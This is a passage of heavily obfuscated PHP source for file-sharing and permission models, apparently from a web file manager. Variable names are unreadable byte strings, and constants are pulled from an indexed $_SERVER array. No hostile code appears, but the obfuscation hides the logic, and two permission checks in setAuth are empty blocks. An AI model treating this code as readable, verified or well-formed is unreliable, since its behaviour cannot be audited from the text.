$¢£²î™…óå[$ØÎ¸®Øú‚ğ°[1879]] = $¶Öó‡[$¢£²î™…óå[$ØÎ¸®Øú‚ğ°[482]]]; } unset($¢£²î™…óå); $¸ÚßÔ¤Íõ = array($ØÎ¸®Øú‚ğ°[1884] => $â¯æÈ©…, $ØÎ¸®Øú‚ğ°[1885] => $Îç[$ØÎ¸®Øú‚ğ°[364]]); return $¸ÚßÔ¤Íõ; } protected function shareAdd($¤Á…¾¹åôÊ†¯, $å™ƒ†ô) { $²ÎæÄ =& $_SERVER[ÀÆ]; $Ú·ÛÒî¿ï = $this->_addShareData($¤Á…¾¹åôÊ†¯, $å™ƒ†ô); if (!empty($å™ƒ†ô[$²ÎæÄ[1886]])) { $this->_shareAuthSet($Ú·ÛÒî¿ï, $å™ƒ†ô[$²ÎæÄ[1886]]); } $this->shareEventAdd($¤Á…¾¹åôÊ†¯, $å™ƒ†ô, $²ÎæÄ[1091]); return $Ú·ÛÒî¿ï; } protected function shareAddSystem($¶Àí, $…ûğ‘•) { $’¯ÜºŒÍÀñ¦ =& $_SERVER[ÀÆ]; $°ëñÙ›Ù = $this->_addShareData($¶Àí, $…ûğ‘•, $’¯ÜºŒÍÀñ¦[1203]); $this->_shareAuthSet($°ëñÙ›Ù, $…ûğ‘•[$’¯ÜºŒÍÀñ¦[1886]]); return $°ëñÙ›Ù; } private function shareEventAdd($ıºÇğ•, $¼Æ, $÷—½”€ı© = "\141\144\144") { $ğÓ =& $_SERVER[ÀÆ]; if (!$ıºÇğ• || $ıºÇğ• == $ğÓ[191]) { return; } if ($÷—½”€ı© == $ğÓ[1091]) { if ($¼Æ[$ğÓ[487]] == $ğÓ[87]) { Model($ğÓ[558])->eventShare($ıºÇğ•, $ğÓ[1887]); } if ($¼Æ[$ğÓ[489]] == $ğÓ[87]) { Model($ğÓ[558])->eventShare($ıºÇğ•, $ğÓ[1888]); } return; } $ Ÿ¸” = $this->getInfoByPath($ıºÇğ•); $­Öº‚¤Ë = $ğÓ[1889]; if ($ Ÿ¸”[$ğÓ[487]] == $ğÓ[191] && $¼Æ[$ğÓ[487]] == $ğÓ[87]) { $­Öº‚¤Ë = $ğÓ[1887]; } if ($ Ÿ¸”[$ğÓ[487]] == $ğÓ[87] && $¼Æ[$ğÓ[487]] == $ğÓ[191]) { $­Öº‚¤Ë = $ğÓ[1890]; } if ($ Ÿ¸”[$ğÓ[489]] == $ğÓ[191] && $¼Æ[$ğÓ[489]] == $ğÓ[87]) { $­Öº‚¤Ë = $ğÓ[1888]; } if ($ Ÿ¸”[$ğÓ[489]] == $ğÓ[87] && $¼Æ[$ğÓ[489]] == $ğÓ[191]) { $­Öº‚¤Ë = $ğÓ[1891]; } Model($ğÓ[558])->eventShare($ıºÇğ•, $­Öº‚¤Ë); return; } private function _addShareData($€‘›Ãúã¬ª, $Âœ = array(), $ú¥¦ÓÙ‡éÓ›é = false) { $Ò“–Òş‹‚× =& $_SERVER[ÀÆ]; $¹ÊàŒ Ò‡Æœ = $ú¥¦ÓÙ‡éÓ›é == $Ò“–Òş‹‚×[1203] ? 0 : USER_ID; $öÊÇú°æ = array($Ò“–Òş‹‚×[412] => $€‘›Ãúã¬ª, $Ò“–Òş‹‚×[1563] => $¹ÊàŒ Ò‡Æœ); if ($€‘›Ãúã¬ª == 0) { $öÊÇú°æ = array($Ò“–Òş‹‚×[1892] => $Âœ[$Ò“–Òş‹‚×[1103]], $Ò“–Òş‹‚×[1563] => $¹ÊàŒ Ò‡Æœ); } if ($şÖª = $this->where($öÊÇú°æ)->find()) { return $şÖª[$Ò“–Òş‹‚×[482]]; } if ($€‘›Ãúã¬ª == 0) { $âƒ„ÖĞ‡ÈÕ½ = array($Ò“–Òş‹‚×[28] => get_path_this($Âœ[$Ò“–Òş‹‚×[76]])); } else { $âƒ„ÖĞ‡ÈÕ½ = Model($Ò“–Òş‹‚×[817])->sourceInfo($€‘›Ãúã¬ª); if (!$âƒ„ÖĞ‡ÈÕ½) { return !1; } } if (!$Âœ[$Ò“–Òş‹‚×[1474]]) { $Âœ[$Ò“–Òş‹‚×[1474]] = $âƒ„ÖĞ‡ÈÕ½[$Ò“–Òş‹‚×[28]]; } $è‡áô¯ = array($Ò“–Òş‹‚×[1563] => $¹ÊàŒ Ò‡Æœ, $Ò“–Òş‹‚×[412] => $€‘›Ãúã¬ª, $Ò“–Òş‹‚×[1474] => $Ò“–Òş‹‚×[33], $Ò“–Òş‹‚×[487] => 0, $Ò“–Òş‹‚×[489] => 0, $Ò“–Òş‹‚×[1103] => $Ò“–Òş‹‚×[33], $Ò“–Òş‹‚×[305] => $Ò“–Òş‹‚×[33], $Ò“–Òş‹‚×[883] => $Ò“–Òş‹‚×[33], $Ò“–Òş‹‚×[1893] => 0, $Ò“–Òş‹‚×[1894] => 0, $Ò“–Òş‹‚×[490] => 0, $Ò“–Òş‹‚×[491] => $Ò“–Òş‹‚×[33], $Ò“–Òş‹‚×[484] => $Ò“–Òş‹‚×[33]); $ö·˜€É÷ = explode($Ò“–Òş‹‚×[47], $Ò“–Òş‹‚×[1895]); foreach ($ö·˜€É÷ as $“Øó•ê£¨) { if (!isset($Âœ[$“Øó•ê£¨])) { continue; } $è‡áô¯[$“Øó•ê£¨] = $Âœ[$“Øó•ê£¨]; } $ˆÙôƒÁ = $this->add($è‡áô¯); $ÄÎ“ôö = array($Ò“–Òş‹‚×[484] => short_id($ˆÙôƒÁ)); $this->where(array($Ò“–Òş‹‚×[481] => $ˆÙôƒÁ))->save($ÄÎ“ôö); return $ˆÙôƒÁ; } private function _shareAuthSet($¾Åë, $ÀĞ£ë) { $•ì´©—èøº =& $_SERVER[ÀÆ]; if (!is_array($ÀĞ£ë)) { return !1; } $ã—è°‹ı€Ü¾˜ = Model($•ì´©—èøº[1846]); $ã—è°‹ı€Ü¾˜->where(array($•ì´©—èøº[482] => $¾Åë))->delete(); $âºÕ©Õ« = array(); foreach ($ÀĞ£ë as $æå±Í) { $¾ïæ© = SourceModel::TYPE_USER; if ($æå±Í[$•ì´©—èøº[406]] == SourceModel::TYPE_GROUP) { $¾ïæ© = SourceModel::TYPE_GROUP; } $¿†¸üÉûŠÃ™ = array($•ì´©—èøº[482] => $¾Åë, $•ì´©—èøº[406] => $¾ïæ©, $•ì´©—èøº[498] => intval($æå±Í[$•ì´©—èøº[498]]), $•ì´©—èøº[1842] => 0, $•ì´©—èøº[1896] => -1); if ($æå±Í[$•ì´©—èøº[1842]]) { $¿†¸üÉûŠÃ™[$•ì´©—èøº[1842]] = $æå±Í[$•ì´©—èøº[1842]]; } else { if ($æå±Í[$•ì´©—èøº[1896]]) { $¿†¸üÉûŠÃ™[$•ì´©—èøº[1896]] = $æå±Í[$•ì´©—èøº[1896]]; } } $âºÕ©Õ«[] = $¿†¸üÉûŠÃ™; } return $ã—è°‹ı€Ü¾˜->addAll($âºÕ©Õ«, array(), !0); } public function numViewAdd($ñùÁ¹ò) { $¿ =& $_SERVER[ÀÆ]; $ñö© = array($¿[481] => $ñùÁ¹ò); $this->where($ñö©)->setAdd($¿[1893]); } public function numDownloadAdd($¦­²Ñß™»Æ£) { $»Ç¾Í¤ŞÎ =& $_SERVER[ÀÆ]; $×ÀÔµà = array($»Ç¾Í¤ŞÎ[481] => $¦­²Ñß™»Æ£); $this->where($×ÀÔµà)->setAdd($»Ç¾Í¤ŞÎ[1894]); } protected function shareEdit($å Ÿú²¢Ù±, $“ãüğˆ) { $Õ„Ö¹èÁ´ÎÆ =& $_SERVER[ÀÆ]; $÷¿õ¨„¿Ë = $this->getInfo($å Ÿú²¢Ù±); if (!$÷¿õ¨„¿Ë) { return !1; } $this->_checkLinkShare($“ãüğˆ, $÷¿õ¨„¿Ë); $àÎ…“ = array(); $µÒ¸ƒ  = explode($Õ„Ö¹èÁ´ÎÆ[47], $Õ„Ö¹èÁ´ÎÆ[1897]); foreach ($µÒ¸ƒ  as $¬ÆûË°êéĞ) { if (!array_key_exists($¬ÆûË°êéĞ, $“ãüğˆ)) { continue; } $àÎ…“[$¬ÆûË°êéĞ] = $“ãüğˆ[$¬ÆûË°êéĞ]; } $this->shareEventAdd($÷¿õ¨„¿Ë[$Õ„Ö¹èÁ´ÎÆ[397]], $“ãüğˆ, $Õ„Ö¹èÁ´ÎÆ[1708]); $this->where(array($Õ„Ö¹èÁ´ÎÆ[481] => $å Ÿú²¢Ù±))->save($àÎ…“); if (isset($“ãüğˆ[$Õ„Ö¹èÁ´ÎÆ[1886]])) { $this->_shareAuthSet($å Ÿú²¢Ù±, $“ãüğˆ[$Õ„Ö¹èÁ´ÎÆ[1886]]); } return !0; } private function _checkLinkShare($§î­®ñ¬Ò€úò, $Õ­) { $à˜õâùó =& $_SERVER[ÀÆ]; if ($§î­®ñ¬Ò€úò[$à˜õâùó[487]] != $à˜õâùó[87]) { return; } $¹À÷¥§± = $Õ­[$à˜õâùó[85]][$à˜õâùó[397]]; if ($Õ­[$à˜õâùó[85]][$à˜õâùó[29]] != $à˜õâùó[193]) { $€¶ÏÉª”‘òÊ = $this->_folderReport($¹À÷¥§±); if (!$€¶ÏÉª”‘òÊ) { return; } show_json(LNG($à˜õâùó[1898]) . $à˜õâùó[1899] . $€¶ÏÉª”‘òÊ, !1); } $ûïæè = Model($à˜õâùó[817])->fileInfoGet($Õ­[$à˜õâùó[85]][$à˜õâùó[397]]); if (!$ûïæè) { return; } $‘’–¨·Ã = $this->shareFileMeta($ûïæè[$à˜õâùó[461]]); if (isset($‘’–¨·Ã[$à˜õâùó[372]]) && $‘’–¨·Ã[$à˜õâùó[372]] == $à˜õâùó[87]) { show_json(LNG($à˜õâùó[1900]), !1); } } private function _folderReport($ÌÙ‰•) { $î¹óÆÉ €÷‡ =& $_SERVER[ÀÆ]; $„Ô’ = array($î¹óÆÉ €÷‡[461] => array($î¹óÆÉ €÷‡[1003], 0), $î¹óÆÉ €÷‡[735] => 3); $îşÇøò…ß = Model($î¹óÆÉ €÷‡[1901])->where($„Ô’)->field($î¹óÆÉ €÷‡[461])->select(); if (!$îşÇøò…ß) { return !1; } $îşÇøò…ß = array_to_keyvalue($îşÇøò…ß, $î¹óÆÉ €÷‡[33], $î¹óÆÉ €÷‡[461]); $´¿Û€¹İş¶• = $î¹óÆÉ €÷‡[47] . $ÌÙ‰• . $î¹óÆÉ €÷‡[47]; $„Ô’ = array($î¹óÆÉ €÷‡[461] => array($î¹óÆÉ €÷‡[7], $îşÇøò…ß), $î¹óÆÉ €÷‡[515] => array($î¹óÆÉ €÷‡[381], "\x25{$´¿Û€¹İş¶•}\x25"), $î¹óÆÉ €÷‡[425] => 0); $‹îäÙø§ = Model($î¹óÆÉ €÷‡[817])->where($„Ô’)->field($î¹óÆÉ €÷‡[1902])->find(); if (!$‹îäÙø§) { return !1; } $ÔÚ¤ = substr($‹îäÙø§[$î¹óÆÉ €÷‡[515]], strpos($‹îäÙø§[$î¹óÆÉ €÷‡[515]], $´¿Û€¹İş¶•)); $„Ô’ = array($î¹óÆÉ €÷‡[397] => array($î¹óÆÉ €÷‡[7], trim($ÔÚ¤, $î¹óÆÉ €÷‡[47]))); $Ÿ÷Ä = Model($î¹óÆÉ €÷‡[817])->where($„Ô’)->field($î¹óÆÉ €÷‡[28])->select(); $ôîŒ’¿û› = array_to_keyvalue($Ÿ÷Ä, $î¹óÆÉ €÷‡[33], $î¹óÆÉ €÷‡[28]); $ôîŒ’¿û›[] = $‹îäÙø§[$î¹óÆÉ €÷‡[28]]; return implode($î¹óÆÉ €÷‡[8], $ôîŒ’¿û›); } protected function remove($ñÕƒ) { $ç–ùÓ˜¦• =& $_SERVER[ÀÆ]; if (is_array($ñÕƒ)) { $ñÕƒ = array($ç–ùÓ˜¦•[7], $ñÕƒ); } $óÎ = array($ç–ùÓ˜¦•[482] => $ñÕƒ); $ÜØÜ´àÂ = $this->where($óÎ)->delete(); if ($ÜØÜ´àÂ) { Model($ç–ùÓ˜¦•[590])->where(array($ç–ùÓ˜¦•[482] => $ñÕƒ))->delete(); } $ÄÓÓ = is_array($ñÕƒ) ? $ñÕƒ[1] : array($ñÕƒ); for ($“óÚçß² = 0; $“óÚçß² < count($ÄÓÓ); $“óÚçß²++) { $ñ“£›Áİ©ÇŸÍ = $this->getInfo($ÄÓÓ[$“óÚçß²]); if ($ñ“£›Áİ©ÇŸÍ[$ç–ùÓ˜¦•[489]] == $ç–ùÓ˜¦•[87]) { Model($ç–ùÓ˜¦•[558])->eventShare($ñ“£›Áİ©ÇŸÍ[$ç–ùÓ˜¦•[397]], $ç–ùÓ˜¦•[1891]); } if ($ñ“£›Áİ©ÇŸÍ[$ç–ùÓ˜¦•[487]] == $ç–ùÓ˜¦•[87]) { Model($ç–ùÓ˜¦•[558])->eventShare($ñ“£›Áİ©ÇŸÍ[$ç–ùÓ˜¦•[397]], $ç–ùÓ˜¦•[1890]); } } return $ÜØÜ´àÂ; } protected function removeBySource($Ş”¿â) { $¬Åç =& $_SERVER[ÀÆ]; $ƒäö©ú†¡¬Ÿü = array($¬Åç[412] => array($¬Åç[413], $Ş”¿â)); $ñµ» = $this->field($¬Åç[482])->where($ƒäö©ú†¡¬Ÿü)->select(); $ñµ» = array_to_keyvalue($ñµ», $¬Åç[33], $¬Åç[482]); if (!$ñµ») { return; } $ƒäö©ú†¡¬Ÿü = array($¬Åç[481] => array($¬Åç[413], $ñµ»)); $this->where($ƒäö©ú†¡¬Ÿü)->delete(); Model($¬Åç[590])->where($ƒäö©ú†¡¬Ÿü)->delete(); } public function listAll($œ¨ı÷†¢) { $Ğ†äÂ =& $_SERVER[ÀÆ]; $ÆãçÖ = array(); if ($œ¨ı÷†¢[$Ğ†äÂ[1572]]) { $ÆãçÖ[$Ğ†äÂ[1572]] = $œ¨ı÷†¢[$Ğ†äÂ[1572]]; } if ($œ¨ı÷†¢[$Ğ†äÂ[746]]) { $˜²­ÕÒë = $œ¨ı÷†¢[$Ğ†äÂ[490]] ? $œ¨ı÷†¢[$Ğ†äÂ[490]] : strtotime(date($Ğ†äÂ[1903])); $ÆãçÖ[$Ğ†äÂ[194]] = array($Ğ†äÂ[331], array($œ¨ı÷†¢[$Ğ†äÂ[746]], $˜²­ÕÒë)); } if ($œ¨ı÷†¢[$Ğ†äÂ[29]]) { $ÆãçÖ[$œ¨ı÷†¢[$Ğ†äÂ[29]]] = 1; } else { $ÆãçÖ[] = array($Ğ†äÂ[487] => array($Ğ†äÂ[1003], 0), $Ğ†äÂ[489] => array($Ğ†äÂ[1003], 0), $Ğ†äÂ[1880] => $Ğ†äÂ[1834]); } if ($œ¨ı÷†¢[$Ğ†äÂ[1830]]) { $ÆãçÖ[] = array($Ğ†äÂ[484] => $œ¨ı÷†¢[$Ğ†äÂ[1830]], $Ğ†äÂ[1474] => array($Ğ†äÂ[381], "\x25{$œ¨ı÷†¢[$Ğ†äÂ[1830]]}\x25"), $Ğ†äÂ[1880] => $Ğ†äÂ[1834]); } $¨Ã­ó = $this->_makeOrder()->where($ÆãçÖ)->selectPage(20); if (empty($¨Ã­ó[$Ğ†äÂ[367]])) { return array(); } $this->_listDataApply($¨Ã­ó[$Ğ†äÂ[367]]); return $¨Ã­ó; } public function listDataApply($‹Å) { $this->_listDataApply($‹Å); return $‹Å; } private function _listDataApply(&$íÛ›) { $—‰‘³ =& $_SERVER[ÀÆ]; $ÀŸ = array_to_keyvalue($íÛ›, $—‰‘³[33], $—‰‘³[1572]); $•ˆ = Model($—‰‘³[532])->userListInfo(array_unique($ÀŸ)); $×àØªÜÑ¦ = array_to_keyvalue($íÛ›, $—‰‘³[33], $—‰‘³[397]); $‰ÃÖ¥€îå = Model($—‰‘³[817])->sourceListInfo($×àØªÜÑ¦, !0); foreach ($íÛ› as $ô¬Ë­£Çí => &$¾™œÔÖà) { $“¢ğÈÄ¬ùÚë† = $¾™œÔÖà[$—‰‘³[1572]]; $¾™œÔÖà[$—‰‘³[1904]] = $•ˆ[$“¢ğÈÄ¬ùÚë†] ? $•ˆ[$“¢ğÈÄ¬ùÚë†] : !1; $É  = $¾™œÔÖà[$—‰‘³[397]]; $¾™œÔÖà[$—‰‘³[85]] = $‰ÃÖ¥€îå[$É ] ? $‰ÃÖ¥€îå[$É ] : !1; if ($¾™œÔÖà[$—‰‘³[85]][$—‰‘³[425]] == $—‰‘³[87]) { unset($íÛ›[$ô¬Ë­£Çí]); } if ($¾™œÔÖà[$—‰‘³[85]] != $—‰‘³[191] && !$¾™œÔÖà[$—‰‘³[85]]) { unset($íÛ›[$ô¬Ë­£Çí]); } } unset($¾™œÔÖà); $íÛ› = array_values($íÛ›); } private function _makeOrder($âïšŞ´¿ç” = '') { $ŒôıÎùÖ =& $_SERVER[ÀÆ]; $Ó¤ßÊğ¢ = array($ŒôıÎùÖ[194], $ŒôıÎùÖ[490], $ŒôıÎùÖ[1893], $ŒôıÎùÖ[1894]); $ÇÎø¬ÄÙ“ = array($ŒôıÎùÖ[442] => $ŒôıÎùÖ[443], $ŒôıÎùÖ[444] => $ŒôıÎùÖ[445]); $–÷  = Input::get($ŒôıÎùÖ[449], $ŒôıÎùÖ[7], $ŒôıÎùÖ[418], $Ó¤ßÊğ¢); $©Ü˜•©œ‚¬ = Input::get($ŒôıÎùÖ[450], $ŒôıÎùÖ[7], $ŒôıÎùÖ[1905], array($ŒôıÎùÖ[1829], $ŒôıÎùÖ[444])); $©Ü˜•©œ‚¬ = $ÇÎø¬ÄÙ“[$©Ü˜•©œ‚¬]; $âïšŞ´¿ç” = $âïšŞ´¿ç” . "{$–÷ }\x20{$©Ü˜•©œ‚¬}"; return $this->order($âïšŞ´¿ç”); } public function reportAdd($ŞÊË¿Ö¼†) { $ƒ¿ÑŒè“ =& $_SERVER[ÀÆ]; $£Ûğ«á¹õÁ = array($ƒ¿ÑŒè“[482] => $ŞÊË¿Ö¼†[$ƒ¿ÑŒè“[482]], $ƒ¿ÑŒè“[1572] => USER_ID); if (Model($ƒ¿ÑŒè“[1901])->where($£Ûğ«á¹õÁ)->find()) { return !1; } $«¦õüó = array($ƒ¿ÑŒè“[482] => $ŞÊË¿Ö¼†[$ƒ¿ÑŒè“[482]], $ƒ¿ÑŒè“[1474] => $ŞÊË¿Ö¼†[$ƒ¿ÑŒè“[1474]], $ƒ¿ÑŒè“[397] => $ŞÊË¿Ö¼†[$ƒ¿ÑŒè“[397]], $ƒ¿ÑŒè“[461] => $ŞÊË¿Ö¼†[$ƒ¿ÑŒè“[461]], $ƒ¿ÑŒè“[1572] => USER_ID, $ƒ¿ÑŒè“[29] => $ŞÊË¿Ö¼†[$ƒ¿ÑŒè“[29]], $ƒ¿ÑŒè“[445] => $ŞÊË¿Ö¼†[$ƒ¿ÑŒè“[445]]); return Model($ƒ¿ÑŒè“[1901])->add($«¦õüó); } public function reportList($ˆÕš) { $›•øº’ =& $_SERVER[ÀÆ]; $Ã¡•™·é = array(); if ($ˆÕš[$›•øº’[746]]) { $ÑÆÈùŠâÒò¤ = $ˆÕš[$›•øº’[490]] ? $ˆÕš[$›•øº’[490]] : strtotime(date($›•øº’[1903])); $Ã¡•™·é[$›•øº’[194]] = array($›•øº’[331], array($ˆÕš[$›•øº’[746]], $ÑÆÈùŠâÒò¤)); } if (isset($ˆÕš[$›•øº’[29]]) && in_array($ˆÕš[$›•øº’[29]], array($›•øº’[87], $›•øº’[429], $›•øº’[1906], $›•øº’[1907], $›•øº’[1908]))) { $Ã¡•™·é[$›•øº’[29]] = $ˆÕš[$›•øº’[29]]; } if (isset($ˆÕš[$›•øº’[735]]) && in_array($ˆÕš[$›•øº’[735]], array($›•øº’[191], $›•øº’[87], $›•øº’[429], $›•øº’[1906]))) { $Ã¡•™·é[$›•øº’[735]] = $ˆÕš[$›•øº’[735]]; } $ °¿Å = Input::get($›•øº’[450], $›•øº’[7], $›•øº’[1905], array($›•øº’[1829], $›•øº’[444])); $™ÆİÉÚ„Õ = array($›•øº’[442] => $›•øº’[443], $›•øº’[444] => $›•øº’[445]); $ÜüîÇè = $›•øº’[1909] . $™ÆİÉÚ„Õ[$ °¿Å]; $ÇƒùÑ§´» = Model($›•øº’[1901])->where($Ã¡•™·é)->order($ÜüîÇè)->selectPage(20); if (empty($ÇƒùÑ§´»[$›•øº’[367]])) { return array(); } $ŠÂºà¡î— = array_to_keyvalue_group($ÇƒùÑ§´»[$›•øº’[367]], $›•øº’[735], $›•øº’[482]); if (!empty($ŠÂºà¡î—[0])) { $ˆÕš = $ŠÂºà¡î—[0]; $Ã¡•™·é = array($›•øº’[482] => array($›•øº’[7], $ˆÕš)); $Ä€ = $this->where($Ã¡•™·é)->field($›•øº’[482])->select(); $Ä€ = array_to_keyvalue($Ä€, $›•øº’[33], $›•øº’[482]); $€¢Ÿğ”ÍéÊ = array_diff($ˆÕš, $Ä€); if (!empty($€¢Ÿğ”ÍéÊ)) { foreach ($ÇƒùÑ§´»[$›•øº’[367]] as $ç½² => $ıØõŒ§ßøş‚Ö) { if (in_array($ıØõŒ§ßøş‚Ö[$›•øº’[482]], $€¢Ÿğ”ÍéÊ)) { unset($ÇƒùÑ§´»[$›•øº’[367]][$ç½²]); } } } } $this->_listDataApply($ÇƒùÑ§´»[$›•øº’[367]]); return $ÇƒùÑ§´»; } public function reportStatus($ƒ›») { $ô–òÀƒ‡É =& $_SERVER[ÀÆ]; $¬ª“ßñÓ»ô“ = array($ô–òÀƒ‡É[395] => $ƒ›»[$ô–òÀƒ‡É[395]]); $“ı = Model($ô–òÀƒ‡É[1901])->where($¬ª“ßñÓ»ô“)->field($ô–òÀƒ‡É[1910])->find(); if (!$“ı) { return !1; } $Ş¥µ× = array($ô–òÀƒ‡É[735] => $ƒ›»[$ô–òÀƒ‡É[735]]); if ($ƒ›»[$ô–òÀƒ‡É[735]] == $ô–òÀƒ‡É[1906] && $“ı[$ô–òÀƒ‡É[735]] == $ô–òÀƒ‡É[1906]) { $Ş¥µ×[$ô–òÀƒ‡É[735]] = 0; } $Ê¥“¿·° = Model($ô–òÀƒ‡É[1901])->where($¬ª“ßñÓ»ô“)->save($Ş¥µ×); if ($ƒ›»[$ô–òÀƒ‡É[735]] == $ô–òÀƒ‡É[429]) { if ($“ı[$ô–òÀƒ‡É[461]] != $ô–òÀƒ‡É[191] && $this->shareFileMeta($“ı[$ô–òÀƒ‡É[461]])) { $this->shareFileMeta($“ı[$ô–òÀƒ‡É[461]], 0); } $this->remove($“ı[$ô–òÀƒ‡É[482]]); return !0; } if ($Ê¥“¿·° && $ƒ›»[$ô–òÀƒ‡É[735]] == $ô–òÀƒ‡É[1906]) { $°ôÆ½¡ÙÇÚÄİ = $Ş¥µ×[$ô–òÀƒ‡É[735]] == $ô–òÀƒ‡É[1906] ? 1 : 0; $this->shareFileMeta($“ı[$ô–òÀƒ‡É[461]], $°ôÆ½¡ÙÇÚÄİ); $this->removeByFile($“ı[$ô–òÀƒ‡É[461]]); } return $Ê¥“¿·°; } private function removeByFile($¥ï™²Ú†©) { $áê¿³­ï†²ÈÔ =& $_SERVER[ÀÆ]; $ø“ìË = Model($áê¿³­ï†²ÈÔ[817])->where(array($áê¿³­ï†²ÈÔ[461] => $¥ï™²Ú†©))->field($áê¿³­ï†²ÈÔ[397])->select(); $ÜŒ«Ş‰óüöä = array_to_keyvalue($ø“ìË, $áê¿³­ï†²ÈÔ[33], $áê¿³­ï†²ÈÔ[397]); $ºµùú‚ = array($áê¿³­ï†²ÈÔ[397] => array($áê¿³­ï†²ÈÔ[7], $ÜŒ«Ş‰óüöä), $áê¿³­ï†²ÈÔ[487] => 1); $ø“ìË = $this->where($ºµùú‚)->field($áê¿³­ï†²ÈÔ[482])->select(); if (empty($ø“ìË)) { return; } $»‰ = array_to_keyvalue($ø“ìË, $áê¿³­ï†²ÈÔ[33], $áê¿³­ï†²ÈÔ[482]); $this->remove($»‰); } private function shareFileMeta($ ğ’±é×€ñ, $ÃåÑßÃî‚¹ = null) { $ˆá·ÑĞ™º™ =& $_SERVER[ÀÆ]; $ĞÕÂãˆò = array($ˆá·ÑĞ™º™[461] => $ ğ’±é×€ñ, $ˆá·ÑĞ™º™[93] => $ˆá·ÑĞ™º™[1911]); if (is_null($ÃåÑßÃî‚¹)) { return Model($ˆá·ÑĞ™º™[1912])->where($ĞÕÂãˆò)->find(); } $ĞÕÂãˆò[$ˆá·ÑĞ™º™[372]] = $ÃåÑßÃî‚¹; Model($ˆá·ÑĞ™º™[1912])->add($ĞÕÂãˆò, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\143\145\137\141\x75\x74\150"; public function getAuth($±¬§Ïù§) { $Ó³ğ =& $_SERVER[ÀÆ]; $‘« = $this->sourceAuthSelect($±¬§Ïù§); $áß = array(); $‹é = array(); $ô÷àóô = 2 << 25; foreach ($‘« as $ëÆŒ) { $¸¥ß£”ŞöÅ = Model($Ó³ğ[501])->listData($ëÆŒ[$Ó³ğ[1842]]); if (!$¸¥ß£”ŞöÅ) { continue; } $áß[] = $ëÆŒ; $ÛÌÆå¿•Ñ = 0; if ($ëÆŒ[$Ó³ğ[406]] == SourceModel::TYPE_GROUP) { $ÛÌÆå¿•Ñ = $ô÷àóô * 2; } if ($ëÆŒ[$Ó³ğ[406]] == SourceModel::TYPE_USER) { $ÛÌÆå¿•Ñ = $ô÷àóô; } if ($ëÆŒ[$Ó³ğ[406]] == SourceModel::TYPE_USER && $ëÆŒ[$Ó³ğ[498]] == $Ó³ğ[191]) { $ÛÌÆå¿•Ñ = 0; } $‹é[] = $¸¥ß£”ŞöÅ[$Ó³ğ[408]] + $ÛÌÆå¿•Ñ; } array_multisort($‹é, SORT_DESC, $áß); return $áß; } public function sourceAuthSelect($Åî) { $œĞÅøÉÏ„·Ö =& $_SERVER[ÀÆ]; static $ı = array(); $æÌ“ = is_array($Åî) ? !1 : !0; if ($æÌ“) { $Åî = array($Åî); } $éÇÏêİ· = array(); foreach ($Åî as $±ÎëŞÉ) { if (isset($ı[$±ÎëŞÉ])) { $éÇÏêİ·[$±ÎëŞÉ] = $ı[$±ÎëŞÉ]; } } if (count($éÇÏêİ·) == count($Åî)) { return $æÌ“ ? $éÇÏêİ·[$Åî[0]] : $éÇÏêİ·; } $šå¾Åê¦ = $œĞÅøÉÏ„·Ö[1913]; $ñõîšœÎ®¬³ = array($œĞÅøÉÏ„·Ö[397] => array($œĞÅøÉÏ„·Ö[7], $Åî)); $éÖ…‚ÈøòÓã× = $this->field($šå¾Åê¦)->order($œĞÅøÉÏ„·Ö[395])->where($ñõîšœÎ®¬³)->select(); $½­ÎĞ = array_to_keyvalue_group($éÖ…‚ÈøòÓã×, $œĞÅøÉÏ„·Ö[397]); foreach ($Åî as $±ÎëŞÉ) { $ı[$±ÎëŞÉ] = $½­ÎĞ[$±ÎëŞÉ] ? $½­ÎĞ[$±ÎëŞÉ] : array(); } if ($æÌ“) { return $éÖ…‚ÈøòÓã×; } return $½­ÎĞ; } public function setAuth($â¸İã, $á×ö›×³°) { $íË =& $_SERVER[ÀÆ]; $æŞ† = Model($íË[1250])->sourceInfo($â¸İã); if (!$æŞ†) { return !1; } if ($æŞ†[$íË[406]] != SourceModel::TYPE_GROUP) { return !1; } $™Š†¦êÛ‰ş€ğ = 1; $ø¾²î = $æŞ†[$íË[498]]; if ($ø¾²î != $™Š†¦êÛ‰ş€ğ) { $óí¼ˆ = array($íË[1739] => $ø¾²î); $»Ì§¿°È = Model($íË[1828])->field($íË[1572])->where($óí¼ˆ)->select(); $»Ì§¿°È = array_to_keyvalue($»Ì§¿°È, $íË[33], $íË[1572]); } $º»Š“Ù¿ÒŞ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¶ÀÖ = array(); foreach ($á×ö›×³° as $›Å‰‚ÌŠ‚Ü÷ê) { if (!in_array($›Å‰‚ÌŠ‚Ü÷ê[$íË[406]], $º»Š“Ù¿ÒŞ)) { show_json(LNG($íË[1914]), !1); } if ($ø¾²î != $™Š†¦êÛ‰ş€ğ) { if ($›Å‰‚ÌŠ‚Ü÷ê[$íË[406]] == SourceModel::TYPE_GROUP) { } if ($›Å‰‚ÌŠ‚Ü÷ê[$íË[498]] != 0 && !in_array($›Å‰‚ÌŠ‚Ü÷ê[$íË[498]], $»Ì§¿°È)) { } } if ($›Å‰‚ÌŠ‚Ü÷ê[$íË[498]] == 0) { $›Å‰‚ÌŠ‚Ü÷ê[$íË[406]] = SourceModel::TYPE_USER; } $¶ÀÖ[] = array($íË[397] => $â¸İã, $íË[406] => intval($›Å‰‚ÌŠ‚Ü÷ê[$íË[406]]), $íË[498] => intval($›Å‰‚ÌŠ‚Ü÷ê[$íË[498]]), $íË[1842] => intval($›Å‰‚ÌŠ‚Ü÷ê[$íË[1842]]) ? intval($›Å‰‚ÌŠ‚Ü÷ê[$íË[1842]]) : 0, $íË[1896] => intval($›Å‰‚ÌŠ‚Ü÷ê[$íË[1896]]) ? intval($›Å‰‚ÌŠ‚Ü÷ê[$íË[1896]]) : -1); } $this->where(array($íË[412] => $â¸İã))->delete(); $this->addAll($¶ÀÖ); return !0; } public function authClear($Çáš’ÃÚ¸Ó Û) { $¶åíÚ¿Â =& $_SERVER[ÀÆ]; $õåŠï¾Í¼ = Model($¶åíÚ¿Â[1250])->sourceInfo($Çáš’ÃÚ¸Ó Û); $º¿Æ˜ç®Ù = array($Çáš’ÃÚ¸Ó Û); if ($õåŠï¾Í¼[$¶åíÚ¿Â[405]] == $¶åíÚ¿Â[87]) { $‘”Õ³û½­µæ = array($¶åíÚ¿Â[578] => array($¶åíÚ¿Â[538], $õåŠï¾Í¼[$¶åíÚ¿Â[515]] . $Çáš’ÃÚ¸Ó Û . $¶åíÚ¿Â[539])); $º¿Æ˜ç®Ù = 